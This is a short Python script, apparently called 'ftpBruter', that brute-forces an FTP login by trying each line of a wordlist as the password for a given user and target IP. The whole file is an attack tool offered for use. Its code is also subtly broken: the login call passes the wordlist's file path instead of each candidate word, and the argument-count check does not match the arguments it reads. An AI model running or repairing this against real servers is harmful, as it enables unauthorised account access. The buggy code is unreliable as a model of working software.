import ftplib
import os
import sys
os.system("clear")


def to_arr(file):
    with open(file,"r") as f:
        return f.read().splitlines()


if len(sys.argv) <3:
    print("""\033[92m
__________________________________________________
 .--. .-.       .---.             .-.           
: .-'.' `.      : .; :           .' `.          
: `; `. .'.---. :   .'.--. .-..-.`. .'.--. .--. 
: :   : : : .; `: .; :: ..': :; : : :' '_.': ..'
:_;   :_; : ._.':___.':_;  `.__.' :_;`.__.':_;  
          : :                                   
          :_;                                   


usage 
./ftpBruter [ip] [user] [wordlist location]

__________________________________________________\033[1m
""")
    sys.exit("")
else:
    ip  = sys.argv[1]
    usr = sys.argv[2]
    pwd = sys.argv[3]
    for i in to_arr(sys.argv[3]):
        try:
            with ftplib.FTP() as s:
                s.connect(ip, 21)
                print("[x] {}:{}".format(usr,i))
                s.login(usr, pwd)
        except ftplib.error_perm:
            print("")
        else:
            print("{}:{} ;)".format(usr,i))

